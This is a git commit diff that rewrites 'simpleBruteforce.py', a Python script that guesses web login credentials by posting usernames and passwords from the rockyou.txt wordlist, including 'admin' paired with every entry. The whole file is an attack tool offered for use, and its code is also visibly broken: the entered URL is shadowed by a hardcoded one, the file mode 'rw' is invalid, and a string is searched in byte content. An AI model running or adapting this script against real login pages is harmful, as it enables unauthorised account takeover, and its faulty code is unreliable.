570e6f0db3f019b897bd116584cf49a42296903a
Ghost56 <94029083+ArchGhost56@users.noreply.github.com>
2021-11-18 10:16:05 +0800

    Update simpleBruteforce.py

--- simpleBruteforce.py
+++ simpleBruteforce.py
@@ -2,35 +2,37 @@ import requests
 import sys
 import os
 import time
-os.system("clear")
-os.system("figlet BRUTEFORCE")
-print ("----------Ghosttool----------")
-time.sleep(2)
-print ("starting..")
-time.sleep(2)
+
+url = 'https://google.com/'                                     # just fill it with smth
+def brute(username : str, password : str):
+    expression = 'incorrect'
+    data = {'username': username,'password': password}
+    r = requests.post(url, data=data)
+    if expression not in r.content :
+        print("[+] Correct password Found: " + str(password))
+        sys.exit()
+    else:
+        print(str(r.content) + " " + str(password))
 
 
-def url	(u):
-url	(u= input("Enter Url: "))
-expression = "incorrect"
-def brute(username,password):
-	data = {'username':username,'password':password}
-	r = requests.post(url,data=data)
-	if expression not in r.content :
-		print "[+] Correct password Found: ",password
-		sys.exit()
-	else:
-		print r.content," ",password
+def main():                            
+    #note that you need rockyou.txt
+    os.system("clear")
+    os.system("figlet BRUTEFORCE")
+    print ("----------Ghosttool----------")
+    time.sleep(2)
+    print ("starting..")
+    time.sleep(2)
 
+    url = input('Enter the url: ')                              # Ask user to enter the url
 
-
-
-def main():                              #note that you need rockyou.txt
-	words = [w.strip() for w in open("rockyou.txt", "rb").readlines()] #parse wordlist
-	for payload in words:
-		brute(payload,"a")
-		brute("admin",payload)
+    with open("rockyou.txt", "rw") as file:                     # 'with' construction will close the file when done
+        whole_file = file.read()
+        words = str(whole_file).split('\n')                     # split file into array (may not work as I expected, read docs)
+    for payload in words:
+        brute(payload, "a")
+        brute("admin", payload)
 
 
 if __name__ == '__main__':
-	main()
+    main()
